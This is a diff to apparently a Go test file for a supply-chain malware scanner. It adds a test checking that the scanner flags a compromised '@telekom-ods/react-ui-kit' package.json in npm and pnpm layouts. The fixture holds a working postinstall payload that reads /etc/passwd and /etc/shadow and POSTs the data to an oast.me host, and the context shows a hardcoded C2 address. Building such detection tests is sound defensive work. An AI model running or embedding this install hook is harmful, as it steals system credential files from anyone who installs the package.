@@ -344,6 +344,54 @@ const C2_URL = process.env.C2_URL || "http://149.28.127.35:8888";
 	}
 }
 
+// TestScan_TelekomODSReactUIKitUnderNodeModules proves the bounded walker
+// reaches the compromised package manifest in npm and pnpm layouts without
+// scanning a lookalike package carrying the same exfiltration markers.
+func TestScan_TelekomODSReactUIKitUnderNodeModules(t *testing.T) {
+	raw := []byte(`{"name":"@telekom-ods/react-ui-kit","version":"2.6.9","scripts":{"postinstall":"sh -c 'data=$(cat /etc/passwd /etc/hosts; id; test -r /etc/shadow && cat /etc/shadow); curl -X POST -H User-Agent:$data http://d9t83osijf9n1gb62e4gxfioysijywqww.oast.me/telekom-ods/$(whoami)/$(hostname)/'"}}`)
+	layouts := []struct {
+		name string
+		rel  string
+	}{
+		{"npm", filepath.Join("node_modules", "@telekom-ods", "react-ui-kit", "package.json")},
+		{"pnpm", filepath.Join("node_modules", ".pnpm", "@telekom-ods+react-ui-kit@2.6.9", "node_modules", "@telekom-ods", "react-ui-kit", "package.json")},
+	}
+	for _, layout := range layouts {
+		t.Run(layout.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, layout.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			lookalike := filepath.Join(root, "node_modules", "other-package", "package.json")
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "telekom-ods-react-ui-kit-system-file-exfil" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("telekom-ods-react-ui-kit-system-file-exfil findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_AmazonInspectorRedShellUnderNodeModules proves the bounded walker
 // reaches the map-streak-kit, streak-map-kit, kit-vim-map, and kit-map-vim source loaders
 // and bundled ELF payload paths in npm and pnpm layouts without scanning a
